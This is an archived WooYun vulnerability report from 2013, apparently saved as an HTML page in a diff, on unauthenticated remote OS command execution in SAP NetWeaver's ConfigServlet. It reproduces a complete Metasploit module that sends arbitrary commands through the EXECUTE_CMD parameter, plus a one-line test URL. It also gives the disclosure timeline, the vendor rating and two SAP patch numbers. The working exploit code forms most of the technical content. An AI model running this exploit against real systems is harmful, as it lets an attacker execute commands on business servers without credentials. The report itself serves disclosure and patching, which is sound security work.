@@ -1,0 +1,245 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		用一个案例说明 SAP NETWEAVER 远程命令执行漏洞的利用与影响  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		用一个案例说明 SAP NETWEAVER 远程命令执行漏洞的利用与影响  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/cnbird">cnbird</a> 
+</li><li>提交时间：		2013-04-19 15:15</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-04-19：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-04-23：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-04-23：	厂商提前公开漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">SAP NetWeaver 是基于专业标准的集成化应用平台，能够大幅度降低系统整合的复杂性。其组件包括门户、应用服务器、商务智能解决方案以及系统整合和数据整合技术。<br />
+<br />
+本次用一个案例说明 SAP NETWEAVER 远程命令执行漏洞的利用与影响。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">SAP NetWeaver 是基于专业标准的集成化应用平台，能够大幅度降低系统整合的复杂性。其组件包括门户、应用服务器、商务智能解决方案以及系统整合和数据整合技术。<br />
+<br />
+<br />
+<br />
+EXP from:<br />
+<br />
+http://packetstormsecurity.com/files/121355/sapconfigservlet-exec.rb.txt<br />
+<br />
+<br />
+<br />
+</p><pre><code>require &#039;msf/core&#039;<br />
+class Metasploit3 &lt; Msf::Auxiliary<br />
+    include Msf::Exploit::Remote::HttpClient<br />
+    include Msf::Auxiliary::Scanner<br />
+ <br />
+    def initialize(info = {})<br />
+        super(update_info(info,<br />
+            &#039;Name&#039;            =&gt; &#039;SAP ConfigServlet OS command execution&#039;,<br />
+            &#039;Description&#039;     =&gt; %q{<br />
+                    This module allows execution of operating system commands through<br />
+                the SAP ConfigServlet without any authentication.<br />
+            },<br />
+            &#039;Author&#039;          =&gt;<br />
+                [<br />
+                    &#039;Dmitry Chastuhin&#039;, # Vulnerability discovery (based on the reference presentation)<br />
+                    &#039;Andras Kabai&#039;, # Metasploit module<br />
+                ],<br />
+            &#039;License&#039;         =&gt; MSF_LICENSE,<br />
+            &#039;References&#039;      =&gt;<br />
+                [<br />
+                    [ &#039;URL&#039;, &#039;http://erpscan.com/wp-content/uploads/2012/11/Breaking-SAP-Portal-HackerHalted-2012.pdf&#039;],<br />
+                ],<br />
+            &#039;DisclosureDate&#039; =&gt; &#039;Nov 01 2012&#039; # Based on the reference presentation<br />
+            ))<br />
+ <br />
+        register_options(<br />
+            [<br />
+                Opt::RPORT(50000),<br />
+                OptString.new(&#039;CMD&#039;, [ true, &#039;The command to execute&#039;, &#039;whoami&#039;]),<br />
+                OptString.new(&#039;PATH&#039;, [ true, &#039;Path to ConfigServlet &#039;, &#039;/ctc/servlet/ConfigServlet&#039;]),<br />
+                OptBool.new(&#039;SSL&#039;, [true, &#039;Use SSL&#039;, false])<br />
+            ], self.class)<br />
+    end<br />
+ <br />
+    def run_host(ip)<br />
+        begin<br />
+            print_status(&quot;#{rhost}:#{rport} - Sending remote command: &quot; + datastore[&#039;CMD&#039;])<br />
+            res = send_request_cgi(<br />
+                {<br />
+                    &#039;uri&#039;    =&gt; datastore[&#039;PATH&#039;] + &#039;?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=&#039; + Rex::Text.uri_encode(datastore[&#039;CMD&#039;]),<br />
+                    &#039;method&#039; =&gt; &#039;GET&#039;,<br />
+                })<br />
+            if !res or res.code != 200<br />
+                print_error(&quot;#{rhost}:#{rport} - Exploit failed.&quot;)<br />
+                return<br />
+            end<br />
+        rescue ::Rex::ConnectionError<br />
+            print_error(&quot;#{rhost}:#{rport} - Failed to connect to the server&quot;)<br />
+            return<br />
+        end<br />
+ <br />
+        if res.body.include?(&quot;Process created&quot;)<br />
+            print_good(&quot;#{rhost}:#{rport} - Exploited successfully\n&quot;)<br />
+            print_line(&quot;#{rhost}:#{rport} - Command: #{datastore[&#039;CMD&#039;]}\n&quot;)<br />
+            print_line(&quot;#{rhost}:#{rport} - Output: #{res.body}&quot;)<br />
+        else<br />
+            print_error(&quot;#{rhost}:#{rport} - Exploit failed.&quot;)<br />
+            vprint_error(&quot;#{rhost}:#{rport} - Output: #{res.body}&quot;)<br />
+        end<br />
+    end<br />
+end</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+测试方法：/ctc/servlet/ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=[command] </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/19182638a81549533d81efa4a85900fd8b03c857.jpg" target="_blank"><img src="../images/19182638a81549533d81efa4a85900fd8b03c857.jpg" alt="hmel.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">联系SAP专业厂家，已经发了补丁了<br />
+<br />
+打如下两个补丁即可<br />
+<br />
+SAP 1467771, <br />
+<br />
+SAP 1445998 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/cnbird" title="cnbird">cnbird</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-022140" title="用一个案例说明 SAP NETWEAVER 远程命令执行漏洞的利用与影响">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-04-23 18:25</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">对于SAP新近披露的远程代码执行漏洞，CNVD仍然在对相关案例进行测试中。先行确认所述情况，互联网上已经披露，案例已经打码，可以提前公开。<br />
+<br />
+按通用软件漏洞进行评分，rank 10</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2013-04-23：案例打码，可以提前公开，让大家学习。</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="22140";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
